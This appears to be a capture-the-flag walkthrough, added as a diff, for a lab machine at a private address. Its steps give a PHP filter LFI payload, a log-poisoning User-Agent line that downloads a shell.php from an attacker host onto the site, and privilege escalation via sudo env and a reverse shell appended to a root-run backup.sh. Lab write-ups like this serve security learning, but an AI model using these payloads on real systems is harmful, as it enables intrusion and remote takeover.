@@ -1,0 +1,10 @@
+Step 1 Enumeration using nmap and gobuster
+
+Step 2 We can see that ?view= in the url is calling php files even if we searched for example a random file ahmad it will by force appened the .php extention to it. So, we wanted to read the script used to handle all this which is index.php and we knew that from the error that is showing after we tried displaying random files. To view this index.php we used a php LFI filter "http://10.10.143.207/?view=php://filter/convert.base64-encode/resource=cat/../index". 
+
+Step 3 Is to perform log poisoning using LFI by using burpsuit's proxy to intercept this request "http://10.10.143.207/?view=cat/../../../../../var/log/apache2/access.log&ext=" and then modify the User-Agent value to have this line which takes a reverse shell from my machine and upload it to the website <?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php'))?> then you can run it from the website/shell.php.
+
+Step 4 For privellege escalation just exploit the env which can be ran as sudo using GTFObins and for the final 4th flag go to the /opt directory and backups, backup.sh append to it /bin/bash and a revshell so you can access the docker container itself as a root.
+
+
+
